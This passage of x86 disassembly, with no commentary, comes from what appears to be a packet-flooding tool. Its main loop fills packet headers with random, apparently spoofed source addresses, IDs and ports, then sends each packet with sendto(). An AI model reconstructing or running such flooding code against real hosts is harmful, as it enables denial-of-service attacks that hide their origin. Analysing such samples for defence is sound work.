mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
call   8048694 <htonl@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x28],eax
mov    eax,ds:0x804ae8c
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,DWORD PTR [ebp-0x28]
mov    edx,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [edx+0xc],eax
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR ds:0x804ae8c
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    WORD PTR [eax+0x4],dx
push   0x4839
call   8048794 <htons@plt>
add    esp,0x4
mov    WORD PTR [ebp-0x28],ax
mov    eax,ds:0x804aeac
mov    DWORD PTR [ebp-0x2c],eax
movzx  edx,WORD PTR [ebp-0x28]
mov    DWORD PTR [ebp-0x28],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [eax+0x4],edx
mov    eax,ds:0x804aeac
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
mov    DWORD PTR [edx+0x8],0x0
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    ecx,0x68db8bad
mov    eax,DWORD PTR [ebp-0x28]
imul   ecx
mov    DWORD PTR [ebp-0x2c],edx
mov    ecx,DWORD PTR [ebp-0x2c]
sar    ecx,0xc
mov    eax,DWORD PTR [ebp-0x28]
sar    eax,0x1f
mov    DWORD PTR [ebp-0x2c],eax
sub    ecx,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x14],ecx
mov    edx,DWORD PTR [ebp-0x14]
shl    edx,0x5
mov    DWORD PTR [ebp-0x2c],edx
sub    DWORD PTR [ebp-0x2c],ecx
shl    DWORD PTR [ebp-0x2c],0x2
add    DWORD PTR [ebp-0x2c],ecx
mov    eax,DWORD PTR [ebp-0x2c]
lea    ecx,[eax*4+0x0]
add    DWORD PTR [ebp-0x2c],ecx
mov    ecx,DWORD PTR [ebp-0x2c]
shl    ecx,0x4
mov    edx,DWORD PTR [ebp-0x28]
sub    edx,ecx
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
inc    eax
mov    WORD PTR [ebp-0x2c],ax
movzx  edx,WORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    WORD PTR [ebp-0x28],ax
mov    edx,DWORD PTR ds:0x804aeac
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    WORD PTR [eax+0x2],dx
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    ecx,0x68db8bad
mov    eax,DWORD PTR [ebp-0x28]
imul   ecx
mov    DWORD PTR [ebp-0x2c],edx
mov    ecx,DWORD PTR [ebp-0x2c]
sar    ecx,0xc
mov    eax,DWORD PTR [ebp-0x28]
sar    eax,0x1f
mov    DWORD PTR [ebp-0x2c],eax
sub    ecx,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x18],ecx
mov    edx,DWORD PTR [ebp-0x18]
shl    edx,0x5
mov    DWORD PTR [ebp-0x2c],edx
sub    DWORD PTR [ebp-0x2c],ecx
shl    DWORD PTR [ebp-0x2c],0x2
add    DWORD PTR [ebp-0x2c],ecx
mov    eax,DWORD PTR [ebp-0x2c]
lea    ecx,[eax*4+0x0]
add    DWORD PTR [ebp-0x2c],ecx
mov    ecx,DWORD PTR [ebp-0x2c]
shl    ecx,0x4
mov    edx,DWORD PTR [ebp-0x28]
sub    edx,ecx
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
inc    eax
mov    WORD PTR [ebp-0x2c],ax
movzx  edx,WORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    WORD PTR [ebp-0x28],ax
mov    edx,DWORD PTR ds:0x804aeac
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    WORD PTR [eax],dx
push   0x10
mov    DWORD PTR [ebp-0x28],0x804aec0
mov    eax,DWORD PTR [ebp-0x28]
push   eax
push   0x0
mov    edx,DWORD PTR ds:0x804aeb0
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
mov    edx,DWORD PTR ds:0x804ae88
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
mov    edx,DWORD PTR ds:0x804ae6c
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   80486c4 <sendto@plt>
add    esp,0x18
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
call   8048694 <htonl@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x28],eax
mov    eax,ds:0x804ae78
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,DWORD PTR [ebp-0x28]
mov    edx,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [edx+0xc],eax
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR ds:0x804ae78
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    WORD PTR [eax+0x4],dx
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,ds:0x804ae70
mov    DWORD PTR [ebp-0x28],eax
mov    ecx,DWORD PTR [ebp-0x2c]
test   ecx,ecx
jge    804975b <main+0x647>
add    ecx,0xf
sar    ecx,0x4
mov    DWORD PTR [ebp-0x1c],ecx
mov    ecx,DWORD PTR [ebp-0x1c]
shl    ecx,0x4
mov    edx,DWORD PTR [ebp-0x2c]
sub    edx,ecx
mov    DWORD PTR [ebp-0x2c],edx
mov    eax,DWORD PTR [ebp-0x2c]
lea    ecx,[eax*4+0x0]
mov    DWORD PTR [ebp-0x2c],0x804ace0
mov    edx,DWORD PTR [ebp-0x2c]
mov    cl,BYTE PTR [ecx+edx*1]
mov    eax,DWORD PTR [ebp-0x28]
mov    BYTE PTR [eax+0x1],cl
push   0x10
mov    DWORD PTR [ebp-0x28],0x804aec0
mov    edx,DWORD PTR [ebp-0x28]
push   edx
push   0x0
mov    eax,ds:0x804aeb8
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR ds:0x804ac7c
mov    DWORD PTR [ebp-0x2c],edx
mov    eax,DWORD PTR [ebp-0x28]
add    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
mov    eax,ds:0x804aea8
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
mov    eax,ds:0x804ae6c
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
call   80486c4 <sendto@plt>
add    esp,0x18
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048694 <htonl@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR ds:0x804ae7c
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [eax+0xc],edx
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    eax,ds:0x804ae7c
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,DWORD PTR [ebp-0x28]
mov    edx,DWORD PTR [ebp-0x2c]
mov    WORD PTR [edx+0x4],ax
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    ecx,0x68db8bad
mov    eax,DWORD PTR [ebp-0x28]
imul   ecx
mov    DWORD PTR [ebp-0x2c],edx
mov    ecx,DWORD PTR [ebp-0x2c]
sar    ecx,0xc
mov    eax,DWORD PTR [ebp-0x28]
sar    eax,0x1f
mov    DWORD PTR [ebp-0x2c],eax
sub    ecx,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x20],ecx
mov    edx,DWORD PTR [ebp-0x20]
shl    edx,0x5
mov    DWORD PTR [ebp-0x2c],edx
sub    DWORD PTR [ebp-0x2c],ecx
shl    DWORD PTR [ebp-0x2c],0x2
add    DWORD PTR [ebp-0x2c],ecx
mov    eax,DWORD PTR [ebp-0x2c]
lea    ecx,[eax*4+0x0]
add    DWORD PTR [ebp-0x2c],ecx
mov    ecx,DWORD PTR [ebp-0x2c]
shl    ecx,0x4
mov    edx,DWORD PTR [ebp-0x28]
sub    edx,ecx
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
inc    eax
mov    WORD PTR [ebp-0x2c],ax
movzx  edx,WORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    WORD PTR [ebp-0x28],ax
mov    edx,DWORD PTR ds:0x804ae84
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    WORD PTR [eax],dx
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    ecx,0x68db8bad
mov    eax,DWORD PTR [ebp-0x28]
imul   ecx
mov    DWORD PTR [ebp-0x2c],edx
mov    ecx,DWORD PTR [ebp-0x2c]
sar    ecx,0xc
mov    eax,DWORD PTR [ebp-0x28]
sar    eax,0x1f
mov    DWORD PTR [ebp-0x2c],eax
sub    ecx,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x24],ecx
mov    edx,DWORD PTR [ebp-0x24]
shl    edx,0x5
mov    DWORD PTR [ebp-0x2c],edx
sub    DWORD PTR [ebp-0x2c],ecx
shl    DWORD PTR [ebp-0x2c],0x2
add    DWORD PTR [ebp-0x2c],ecx
mov    eax,DWORD PTR [ebp-0x2c]
lea    ecx,[eax*4+0x0]
add    DWORD PTR [ebp-0x2c],ecx
mov    ecx,DWORD PTR [ebp-0x2c]
shl    ecx,0x4
mov    edx,DWORD PTR [ebp-0x28]
sub    edx,ecx
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
inc    eax
mov    WORD PTR [ebp-0x2c],ax
movzx  edx,WORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    WORD PTR [ebp-0x28],ax
mov    edx,DWORD PTR ds:0x804ae84
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    WORD PTR [eax+0x2],dx
push   0x10
mov    DWORD PTR [ebp-0x28],0x804aec0
mov    eax,DWORD PTR [ebp-0x28]
push   eax
push   0x0
mov    edx,DWORD PTR ds:0x804aeb4
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
mov    edx,DWORD PTR ds:0x804ae98
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
mov    edx,DWORD PTR ds:0x804ae6c
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   80486c4 <sendto@plt>
add    esp,0x18
test   edi,edi
je     8049978 <main+0x864>
inc    esi
dec    esi
jmp    8049979 <main+0x865>
lea    esi,[esi+0x0]
inc    esi
jmp    8049358 <main+0x244>
mov    esi,esi
lea    esp,[ebp-0x38]
pop    ebx
pop    esi
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,0x804ad24
cmp    DWORD PTR ds:0x804ad24,0xffffffff
je     80499a8 <__do_global_ctors_aux+0x20>
mov    esi,esi
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0xfffffffc
cmp    DWORD PTR [ebx],0xffffffff
jne    804999c <__do_global_ctors_aux+0x14>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
call   80499c1 <_fini+0x9>
pop    ebx
add    ebx,0x1373
call   8048818 <__do_global_dtors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
